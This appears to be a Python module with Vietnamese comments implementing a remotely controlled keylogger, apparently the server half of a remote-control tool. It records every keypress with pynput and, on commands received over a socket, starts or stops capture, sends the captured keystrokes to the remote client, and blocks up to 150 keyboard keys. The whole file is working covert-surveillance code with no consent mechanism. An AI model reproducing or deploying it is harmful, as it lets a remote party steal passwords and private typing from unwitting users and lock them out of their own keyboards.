import keyboard
from pynput.keyboard import Listener 
from constant import *

# = = = = = # = = = = = # = = = = = # GLOBAL CONSTANTS # = = = = = # = = = = = # = = = = = #

KEY_MAPPING = {
    'Key.space': ' ',
    '"\'"': "'"
}

# = = = = = # = = = = = # = = = = = # GLOBAL VARIABLES # = = = = = # = = = = = # = = = = = #

#@param cont: chuỗi các ký tự bắt được từ client
cont = " "
# 
flag = 0
# ...
islock = 0
# ...
ishook = 0

# = = = = = # = = = = = # = = = = = # CORE FUNCTIONS # = = = = = # = = = = = # = = = = = #

def keylogger(key):
    """
    Hàm dùng để bắt những phím được nhấn bởi người dùng. 
    Nó sẽ tìm các key tương ứng với từng ký tự 
    sử dụng KEY_MAPPING dict
    """
    global cont, flag
    if flag == 4:
        return False
    if flag == 1:
        key = str(key)
        cont += KEY_MAPPING.get(key, key.replace("'", ""))

def send_keystrokes(client):
    """
    Hàm có nhiệm vụ gửi lại client chuỗi các phím đã bắt được. 
    Nó cũng xử lý các ngoại lệ xảy ra trong quá trình kết nối.
    """
    global cont
    try:
        client.sendall(bytes(cont, ENCODE_FORMAT))
    except Exception as e:
        print(f"Failed to send keystrokes: {e}")
    finally:
        cont = " "

def lock_keyboard():
    """
    Hàm có chức năng khóa các phím trên bàn phím (lên đến 150 phím). 
    """
    global islock
    if not islock:
        for i in range(150):
            keyboard.block_key(i)
        islock = 1

def unlock_keyboard():
    """
    Hàm này có chức năng bỏ khóa các phím trên bàn phím (lên đến 150 phím). 
    """
    global islock
    if islock:
        for i in range(150):
            keyboard.unblock_key(i)
        islock = 0

def listen():
    """
    Hàm này sẽ khởi tạo một listener để nghe các phím mà người dùng nhập
    và truyền vào hàm keylogger.
    """
    with Listener(on_press = keylogger) as listener:
        listener.join()  

def toggle_lock(argument):
    """
    Hàm này sẽ xác định trạng thái khóa của bàn phím (KHÓA hay BỊ KHÓA). 
    Nó sẽ gọi hàm lock_keyboard hoặc unlock_keyboard tùy thuộc vào trạng thái hiện tại 
    """
    global islock
    if islock:
        unlock_keyboard()
    else:
        lock_keyboard()

def toggle_hook(argument):
    """
    Hàm này xác định trạng thái hoạt động của key logger
    Nếu key logger đang hoạt động, thì sẽ dừng key logger.
    Nếu key logger đang tắt, khởi động key logger.
    """
    global flag, ishook
    if ishook == 0:
        flag = 1
        ishook = 1
    else:
        flag = 2
        ishook = 0

def keylog(client):
    """
    Hàm này sẽ lắng nghe lệnh từ client và thực hiện các hành động tương ứng
    """
    global cont, flag, islock, ishook
    COMMAND_MAPPING = {
        "HOOK": toggle_hook,
        "PRINT": send_keystrokes,
        "LOCK": toggle_lock,
        "QUIT": quit
    }
    while True:
        message = client.recv(BUFFER_SIZE).decode(ENCODE_FORMAT)
        command = COMMAND_MAPPING.get(message)
        if command:
            command(client)
